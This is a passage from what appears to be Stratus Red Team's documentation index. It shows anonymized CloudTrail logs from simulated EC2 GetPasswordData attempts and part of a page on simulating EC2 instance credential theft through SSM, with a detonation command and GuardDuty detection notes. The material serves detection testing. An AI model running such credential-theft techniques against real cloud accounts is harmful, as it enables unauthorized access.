ec2:GetPasswordData action. Encoded authorization failure message: ZUocdTACiGX76lWaShcYz3NiFH7xrcQLJF4xvkdVwj1YRi1LCjXrOGw99KaEjQryXTvxQl8mcoL3NPIH5bvnNm56e4dz1U4_VU1Kxe9GM2GOFvI8Dtz4yeL51wDiwFmt0g9Bfy90J8IevWimq6H-qiLNMbvL8s19Yxe-IPC4EOExJ73IGCm2M0L5Kk1PI1FNzS0V7JnRS53ZBBovZxoY3iJ5KDZ0IJMTbemzqT4uu4YCPzcsnHolRL8LaKniskKGZ4XjVxD3b5pybZ26C7DE77Wq67rlhNwJyRM8RG12tety1tw20hwblshCbJUw2YoR-_UffA4ZbMMDMSS1OkxatoynUOee5zTrapuKfsI592sH5SNLDH2nKzTMu75snXpwMEkkarPJR1rya1g7BQjvB7LcE8lnQV5zwXjCuwLx-yZrDNW6sytsvLt8oS1ASdIJlZk92V1rYCRvBBbMFgIA-0eVACBwrBfrm3x4AGM2YWBbtqtsZUYLr5Ofr6gJWn8xd9Ve-KZ98feGVI0hGzX2RMFbEDF5CeaztSYJ9VnOrxrVH1Cc3oE0GbRcBikla_4vq8_u\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"52242c8d-7ef7-4165-90cd-621ebe835388\",\n      \"eventName\": \"GetPasswordData\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-30T21:31:16Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"457448411975\",\n      \"requestID\": \"0436a948-0d62-49b2-a53a-07f590224fbc\",\n      \"requestParameters\": {\n         \"instanceId\": \"i-gspajwz8z9wrutsz\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"200.249.253.51\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-northsouth-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_5c59eb79-6dac-405c-a4c4-e19aec03c666\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIANQQHHS551LWULIWD\",\n         \"accountId\": \"457448411975\",\n         \"arn\": \"arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000\",\n         \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY:aws-go-sdk-1722375070115152000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-30T21:31:15Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"457448411975\",\n               \"arn\": \"arn:aws:iam::457448411975:role/stratus-red-team-ec2-get-password-data-role\",\n               \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-ec2-get-password-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-northsouth-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000 is not authorized to perform: ec2:GetPasswordData on resource: arn:aws:ec2:apiso-northsouth-3r:457448411975:instance/* because no identity-based policy allows the ec2:GetPasswordData action. Encoded authorization failure message: X7IcIBBP37fUlSTM_9cAnZKJ-zTlv5zmnaUcLS5lQZQfMyq3jfoXbih6NSCKKrWRnPqrCRmxo0uAw7ZIx0iLur5x7fvQq5hq9-ykkM9of1GB6aycacQC7yDzZmnFm8EHAoI3prAsEtL2e6DXtfNjT-XT0V8n69-2o8DVmh5gT7J4MZbfZssfRF-kdyCH4V_QVSv9Greh1Gnluz0EmztA6YAMhPCYG9cXp7GFzeQmQswsocXIXIhziu_UrwFb8hWZRM8Ih4ES3pvcZwzC6UB_bvSMjsVIjrJpNKNhmSievgN-MZno6buBDdsVz7pRCJJzFzvhsdj5S2e-I3jfTTfucNpyZB_xpyuSCghSW63oYi3mL8ek-t5h-sx23hANg523FIRk9w9YI6mmHiK74cwO-OUHgFNd8KERtSXHUBeno95Tp4ONhO6wSXYE6pJj3IevrcmgoWu8IHni6RbNeTC8h5SWb3sknXmdQzeN7UwEpoEEPhWtegFPcX0Zo0vOTb0oawDx16Y6eryN3966VgE_6nuDuCPMSESJngEnXZgtxLDDx4_lVymADHCS1G2vdh7ATuk\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"a9da1fbd-464c-4b74-8c64-96eea2564978\",\n      \"eventName\": \"GetPasswordData\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-30T21:31:16Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"457448411975\",\n      \"requestID\": \"8fdbcf53-b574-44a8-91c5-b81f183c871f\",\n      \"requestParameters\": {\n         \"instanceId\": \"i-ce85lye2frdpml4s\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"200.249.253.51\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-northsouth-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_5c59eb79-6dac-405c-a4c4-e19aec03c666\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIANQQHHS551LWULIWD\",\n         \"accountId\": \"457448411975\",\n         \"arn\": \"arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000\",\n         \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY:aws-go-sdk-1722375070115152000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-30T21:31:15Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"457448411975\",\n               \"arn\": \"arn:aws:iam::457448411975:role/stratus-red-team-ec2-get-password-data-role\",\n               \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-ec2-get-password-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-northsouth-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000 is not authorized to perform: ec2:GetPasswordData on resource: arn:aws:ec2:apiso-northsouth-3r:457448411975:instance/* because no identity-based policy allows the ec2:GetPasswordData action. Encoded authorization failure message: 6Vmm3_Z2lje988np7WwvCzM0gOYUowRA85YdDAIV3rx8y1O2mvqd1bWvJ0Uil_jPCbaRHVGEwnKbxuOEgMThvNpKooEdt2KRMbgEhUvfsdBb_l-tT5d5HM2wGr4t9C5u6uSIj6aJPYtvNrLSYZRz5oAFnjuoJb2m_T-63qxhnVpYvPswmWAUBRhHN7bZs2UVAGUF51CZi0bIB007D6MEkK7vijtzB54oBEZhedPhsLG4axf570Oh7fHoXBKy6AU_W1n-giLzqonpoUsqVuV5K7yTdpJpt0CKTPRYpkJ4ExOF359Q73q0aTd2aDnlWgryBSDVQQdJXHz8zoBOtVF3bl46JK0MTriGclPhz4e-k48Bv9gTMLsyasPIYbf5OwgkKgSrWa4e48F3QRfi4jMe_P9NDIKYQG-vFTyu0hrVoZWbY5OonzJTqYpgkmI1YgmZgKsKIFuKbO37QtAbLPQFJln1vc8cbRbKo3yrIuhiJ0C-lmdr-9saiOkGbcX-iPETeVh7LA8RxbQi74v7AVKq4y8T73bvP3sgiOxaHGx_KD96E-lY_SBy5vvP7EDNUCJO4zHw\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"d2d44fa9-f50b-4877-8a52-9e3855029970\",\n      \"eventName\": \"GetPasswordData\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-30T21:31:16Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"457448411975\",\n      \"requestID\": \"2e320d8a-8922-4741-aefd-86cc33c99f2b\",\n      \"requestParameters\": {\n         \"instanceId\": \"i-z4rfvoc4sgtoirf6\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"200.249.253.51\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-northsouth-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_5c59eb79-6dac-405c-a4c4-e19aec03c666\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIANQQHHS551LWULIWD\",\n         \"accountId\": \"457448411975\",\n         \"arn\": \"arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000\",\n         \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY:aws-go-sdk-1722375070115152000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-30T21:31:15Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"457448411975\",\n               \"arn\": \"arn:aws:iam::457448411975:role/stratus-red-team-ec2-get-password-data-role\",\n               \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-ec2-get-password-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-northsouth-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000 is not authorized to perform: ec2:GetPasswordData on resource: arn:aws:ec2:apiso-northsouth-3r:457448411975:instance/* because no identity-based policy allows the ec2:GetPasswordData action. Encoded authorization failure message: H_1M2f8fBtX-nKWuNweECYRadnJgTd8yB-qZbnIYTBwsE58jAcA13xaXwijpN2uy4ksDhtIwclLwy4y5QxG82pYgzDWogJx94y_UP8_Sb_MTS9xBuWqjmelx0Z0QrF65xf1J79Gj67jI01QYDjVjuIPHR5_ygzq0QUzNU28lcbPiy42MY1GDPp24x-W3HVPDcnOzfTdqV0T-rKp9dVHwNB-lM_OPx3awGgOkofGAsRcP2aduNxYJcATRXhoTczjo7Lvz5rIKp3u5rC1JQDXAxnJ-8WrxidXOcVnTup5nNrkWIo6ACaoupxIf86yS1nJ6drtfU-r2gUuBhduI48K0y4PHP-2AFf-U201axMzqCYZsX5hnWf8hRxa6VLKFMJVsxsuFxZUVAAwm5K2NsEkzHh9T5KWWR2vO7pxFp-BgiarX_5ajJyVeTmON9LYJI3Gqit5eCV2F1mC8Cvy-jvWC88dt_qKzSTKtb5RMwAJZ4HivEXqp6iCdlViSJXbRGK5C3odmUCzGMUs2wV6fMAAcKWinQobra0P8Nn2zzKk6Zqx-ikgMwGDLZ8C5FZiNpjVUrv0\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"f1e17321-830c-4761-854c-158258e915b6\",\n      \"eventName\": \"GetPasswordData\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-30T21:31:16Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"457448411975\",\n      \"requestID\": \"faae9c16-fe9a-457e-a12f-41f71b7469f7\",\n      \"requestParameters\": {\n         \"instanceId\": \"i-rbn1gvh843rzs87g\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"200.249.253.51\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-northsouth-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_5c59eb79-6dac-405c-a4c4-e19aec03c666\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIANQQHHS551LWULIWD\",\n         \"accountId\": \"457448411975\",\n         \"arn\": \"arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000\",\n         \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY:aws-go-sdk-1722375070115152000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-30T21:31:15Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"457448411975\",\n               \"arn\": \"arn:aws:iam::457448411975:role/stratus-red-team-ec2-get-password-data-role\",\n               \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-ec2-get-password-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-northsouth-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"d769ddfd-2cda-4cfa-b33f-05d3b886921d\",\n      \"eventName\": \"AssumeRole\",\n      \"eventSource\": \"sts.amazonaws.com\",\n      \"eventTime\": \"2024-07-30T21:31:15Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"457448411975\",\n      \"requestID\": \"556ffdc4-27d1-4ce9-8932-cdca27641708\",\n      \"requestParameters\": {\n         \"durationSeconds\": 900,\n         \"roleArn\": \"arn:aws:iam::457448411975:role/stratus-red-team-ec2-get-password-data-role\",\n         \"roleSessionName\": \"aws-go-sdk-1722375070115152000\"\n      },\n      \"resources\": [\n         {\n            \"ARN\": \"arn:aws:iam::457448411975:role/stratus-red-team-ec2-get-password-data-role\",\n            \"accountId\": \"457448411975\",\n            \"type\": \"AWS::IAM::Role\"\n         }\n      ],\n      \"responseElements\": {\n         \"assumedRoleUser\": {\n            \"arn\": \"arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000\",\n            \"assumedRoleId\": \"AROAMLQ9F6KHQ07JKA0WY:aws-go-sdk-1722375070115152000\"\n         },\n         \"credentials\": {\n            \"accessKeyId\": \"ASIA7RQR64ZW9JXKWPUO\",\n            \"expiration\": \"Jul 30, 2024, 9:46:15 PM\",\n            \"sessionToken\": \"IQoJb3JpZ2luX2VjEGYaCXVzLWVhc3QtMSJGMEQCIGWKgbykBmpvw3C2tHFJG2Z2EFmm8TFxSMzImeEIU/ZRAiB0qwHtoIdbFspr1VflqA8ScX+dd4rMEEsERlrKK7oVoiqrAghPEAEaDDc1MTM1MzA0MTMxMCIM5ByNCGn4qrkq0GCVKogCwZslL1u9JTIgKxy3FLc5DbnZJDGn8rXDgSa/ePdExCGfg+0jLmpH1UB9bjdXgqf3fVywvv9n3dKO9oI53KhIDxEnt6jbv5g3l4THATYf8KSx32wBKxybA0s5DLSV59jQwT5iFtHZWYRl19ntvhGoi2TlcBfN2QUlR5NjfedcUbpV5hSWwRtU/6tX9PX18qAJxsFfg2zlvgApf93ndSh6esupNF0stzaVzroT1WwSqZDN6onFk/7aZ3bFHQePjWT4l4e17hRbshVwqRNtaZdAIkR+qctOec1bOXRyqk2Fwtm3pAoCF7zC4CmBhav8XA7s2ed7lGI6ZqNG4h44J8lgVuCtf7v9Y/OEMKO3pbUGOp4BWl8lpF5zj8RzOSvPSmeOfCrHx3IIGm6P6Qa6jhOGCWCPUMEGyq3BrXnmBaRrnhTDzErvVJw2ZB9UV+ynLeTwWTC1dK0zYV+6h1wrLFAq2HZEnn9nW2Q4mesr2YicUASap3zWz+28xjIm5+WoiEuSJyirL3UznA4MAZxc1wf/vvuC47vx3M/4X76F6+zGJeO+/VzuwwfkqVYMo7Kag9Q=\"\n         }\n      },\n      \"sourceIPAddress\": \"200.249.253.51\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"sts.apiso-northsouth-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_5c59eb79-6dac-405c-a4c4-e19aec03c666\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAWOGXN38MFN92ING5\",\n         \"accountId\": \"457448411975\",\n         \"arn\": \"arn:aws:iam::457448411975:user/christophe\",\n         \"principalId\": \"AIDAFSHDVNSWGFKZR06G\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-northsouth-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"fd179e25-9f1a-406c-8d7d-62f9d4938ef6\",\n      \"eventName\": \"AssumeRole\",\n      \"eventSource\": \"sts.amazonaws.com\",\n      \"eventTime\": \"2024-07-30T21:31:15Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"457448411975\",\n      \"requestID\": \"880bf8cc-0787-4c2d-8564-3f4ce8946109\",\n      \"requestParameters\": {\n         \"durationSeconds\": 900,\n         \"roleArn\": \"arn:aws:iam::457448411975:role/stratus-red-team-ec2-get-password-data-role\",\n         \"roleSessionName\": \"aws-go-sdk-1722375070115152000\"\n      },\n      \"resources\": [\n         {\n            \"ARN\": \"arn:aws:iam::457448411975:role/stratus-red-team-ec2-get-password-data-role\",\n            \"accountId\": \"457448411975\",\n            \"type\": \"AWS::IAM::Role\"\n         }\n      ],\n      \"responseElements\": {\n         \"assumedRoleUser\": {\n            \"arn\": \"arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000\",\n            \"assumedRoleId\": \"AROAMLQ9F6KHQ07JKA0WY:aws-go-sdk-1722375070115152000\"\n         },\n         \"credentials\": {\n            \"accessKeyId\": \"ASIANQQHHS551LWULIWD\",\n            \"expiration\": \"Jul 30, 2024, 9:46:15 PM\",\n            \"sessionToken\": \"IQoJb3JpZ2luX2VjEGYaCXVzLWVhc3QtMSJHMEUCIGm0kj47xAVKg25149QY6m0tHI8QKHcgIYPKJNYSkt32AiEA64SPa+BDSMJXiGD0qT45dx3H9Hj18oeXyl6fq7G+e4gqqwIITxABGgw3NTEzNTMwNDEzMTAiDJfCBLDTbEWuUNcbICqIAvzAOy3GNiobaWkep5/dAzk/rl6x/Lx+QNE+tUQnTU9xpJWQ6gl0uOxfQaQCingQ6Bwa7AYCIwghP0p+ijLHzj0WK9w6X1M2HgqcLIWaqarREf1xyOsPkFbNsML+1cw50lcxSCEXlQnkCDAGE1cI0wInkycEBuxGFDckceXf4whG9QzNW/jR7fDuzsN5u8GI4UsP77/oa2HISgg6wUT2byc3ni6+YruVQY//2ffKPfQyf1L9RmssxoYGb9t9iazDJjKDunKKZMvMEan4F9+acCbIUrBROgZ9Ays1D1DLjunCfRG9xd2fZ/boG6alhxNmuck39UfAxF1zyLAs3zmdWcQT0Z2croAh0TCjt6W1BjqdARs4DLOAmVNuEmRq1kvuWtdN8C0Q+ObHWUjFYQbcSNyEQOGz6pegmGbypeI9JSgxR7z6GPrSQS1yNWD9+Cs3LNl4Xr/zVmjDYDnVepIWDZ8xYofwlg78esvHzBbdKoKYt7se7feg1Kpyi0UT49BJvpUul9h1PGoQHF5zmVDA/QHqfoq5Ykv5haahEewaCSp6tvgljHXQ0xFDJv/+SIs=\"\n         }\n      },\n      \"sourceIPAddress\": \"200.249.253.51\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"sts.apiso-northsouth-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_5c59eb79-6dac-405c-a4c4-e19aec03c666\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAWOGXN38MFN92ING5\",\n         \"accountId\": \"457448411975\",\n         \"arn\": \"arn:aws:iam::457448411975:user/christophe\",\n         \"principalId\": \"AIDAFSHDVNSWGFKZR06G\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-northsouth-3r\",\n      \"errorCode\": \"AccessDenied\",\n      \"errorMessage\": \"User: arn:aws:iam::457448411975:user/christophe is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::457448411975:role/stratus-red-team-ec2-get-password-data-role\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"46558847-8b84-43de-8c96-302aa4744763\",\n      \"eventName\": \"AssumeRole\",\n      \"eventSource\": \"sts.amazonaws.com\",\n      \"eventTime\": \"2024-07-30T21:31:12Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"457448411975\",\n      \"requestID\": \"bf47f64b-bcf2-441f-a1b8-9cbaa241ff11\",\n      \"requestParameters\": null,\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"200.249.253.51\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"sts.apiso-northsouth-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_5c59eb79-6dac-405c-a4c4-e19aec03c666\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAWOGXN38MFN92ING5\",\n         \"accountId\": \"457448411975\",\n         \"arn\": \"arn:aws:iam::457448411975:user/christophe\",\n         \"principalId\": \"AIDAFSHDVNSWGFKZR06G\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-northsouth-3r\",\n      \"errorCode\": \"AccessDenied\",\n      \"errorMessage\": \"User: arn:aws:iam::457448411975:user/christophe is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::457448411975:role/stratus-red-team-ec2-get-password-data-role\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"8a8844ff-dc95-4ef5-87d2-d86cc23fedd0\",\n      \"eventName\": \"AssumeRole\",\n      \"eventSource\": \"sts.amazonaws.com\",\n      \"eventTime\": \"2024-07-30T21:31:10Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"457448411975\",\n      \"requestID\": \"b3f190d5-4701-47ef-9fb0-76e8b7877df0\",\n      \"requestParameters\": null,\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"200.249.253.51\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"sts.apiso-northsouth-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_5c59eb79-6dac-405c-a4c4-e19aec03c666\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAWOGXN38MFN92ING5\",\n         \"accountId\": \"457448411975\",\n         \"arn\": \"arn:aws:iam::457448411975:user/christophe\",\n         \"principalId\": \"AIDAFSHDVNSWGFKZR06G\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   }\n]\n</code></pre> <ol> <li> <p>These logs have been gathered from a real detonation of this technique in a test environment using Grimoire, and anonymized using LogLicker.\u00a0\u21a9</p> </li> </ol>"},{"location":"attack-techniques/AWS/aws.credential-access.ec2-steal-instance-credentials/","title":"Steal EC2 Instance Credentials","text":"<p>slow idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.credential-access.ec2-steal-instance-credentials/#mappings","title":"Mappings","text":"<ul> <li> <p>MITRE ATT&amp;CK</p> <ul> <li>Credential Access</li> </ul> </li> <li> <p>Threat Technique Catalog for AWS:</p> <ul> <li>Unsecured Credentials: Cloud Instance Metadata API (T1552.005)</li> </ul> </li> </ul>"},{"location":"attack-techniques/AWS/aws.credential-access.ec2-steal-instance-credentials/#description","title":"Description","text":"<p>Simulates the theft of EC2 instance credentials from the Instance Metadata Service.</p> <p>Warm-up:</p> <ul> <li>Create the prerequisite EC2 instance and VPC (takes a few minutes).</li> </ul> <p>Detonation:</p> <ul> <li>Execute a SSM command on the instance to retrieve temporary credentials</li> <li>Use these credentials locally (outside the instance) to run the following commands:<ul> <li>sts:GetCallerIdentity</li> <li>ec2:DescribeInstances</li> </ul> </li> </ul>"},{"location":"attack-techniques/AWS/aws.credential-access.ec2-steal-instance-credentials/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.credential-access.ec2-steal-instance-credentials\n</code></pre>"},{"location":"attack-techniques/AWS/aws.credential-access.ec2-steal-instance-credentials/#detection","title":"Detection","text":"<p>GuardDuty provides two findings to identify stolen EC2 instance credentials.</p> <ul> <li>InstanceCredentialExfiltration.OutsideAWS identifies EC2 instance credentials used from outside an AWS account.</li> <li>InstanceCredentialExfiltration.InsideAWS  identifies EC2 instance credentials used from a different AWS account than the one of the EC2 instance.</li> </ul> <p>See also: Known detection bypasses.</p>"},{"location":"attack-techniques/AWS/aws.credential-access.ec2-steal-instance-credentials/#detonation-logs-new","title":"Detonation logs new!","text":"<p>The following CloudTrail events are generated when this technique is detonated<sup>1</sup>:</p> <ul> <li> <p><code>ec2:DescribeInstances</code></p> </li> <li> <p><code>ssm:DescribeInstanceInformation</code></p> </li> <li> <p><code>ssm:GetCommandInvocation</code></p> </li> <li> <p><code>ssm:SendCommand</code></p> </li> <li> <p><code>sts:GetCallerIdentity</code></p> </li> </ul> View raw detonation logs <pre><code>[\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"2a5178c8-b4c7-44ba-b066-1ecc79b7087c\",\n      \"eventName\": \"SendCommand\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:23:24Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"ff024f6e-78cd-4f36-95cf-7179c6421e32\",\n      \"requestParameters\": {\n         \"documentName\": \"AWS-RunShellScript\",\n         \"instanceIds\": [\n            \"i-786a3A8B5C0d92eF4\"\n         ],\n         \"interactive\": false,\n         \"parameters\": \"HIDDEN_DUE_TO_SECURITY_REASONS\"\n      },\n      \"responseElements\": {\n         \"command\": {\n            \"alarmConfiguration\": {\n               \"alarms\": [],\n               \"ignorePollAlarmFailure\": false\n            },\n            \"clientName\": \"\",\n            \"clientSourceId\": \"\",\n            \"cloudWatchOutputConfig\": {\n               \"cloudWatchLogGroupName\": \"\",\n               \"cloudWatchOutputEnabled\": false\n            },\n            \"commandId\": \"f6887251-cdde-4251-a026-f50a25f521f7\",\n            \"comment\": \"\",\n            \"completedCount\": 0,\n            \"deliveryTimedOutCount\": 0,\n            \"documentName\": \"AWS-RunShellScript\",\n            \"documentVersion\": \"$DEFAULT\",\n            \"errorCount\": 0,\n            \"expiresAfter\": \"Aug 2, 2024, 10:23:24 AM\",\n            \"hasCancelCommandSignature\": false,\n            \"hasSendCommandSignature\": false,\n            \"instanceIds\": [\n               \"i-786a3A8B5C0d92eF4\"\n            ],\n            \"interactive\": false,\n            \"maxConcurrency\": \"50\",\n            \"maxErrors\": \"0\",\n            \"notificationConfig\": {\n               \"notificationArn\": \"\",\n               \"notificationEvents\": [],\n               \"notificationType\": \"\"\n            },\n            \"outputS3BucketName\": \"\",\n            \"outputS3KeyPrefix\": \"\",\n            \"outputS3Region\": \"us-north-2r\",\n            \"parameters\": \"HIDDEN_DUE_TO_SECURITY_REASONS\",\n            \"requestedDateTime\": \"Aug 2, 2024, 8:23:24 AM\",\n            \"serviceRole\": \"\",\n            \"status\": \"Pending\",\n            \"statusDetails\": \"Pending\",\n            \"targetCount\": 1,\n            \"targets\": [],\n            \"timeoutSeconds\": 3600,\n            \"triggeredAlarms\": []\n         }\n      },\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAAM80VXLJF8NPK4VC\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:iam::017622104382:user/christophe\",\n         \"principalId\": \"AIDASSXYG8SJ3JDII10C\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": 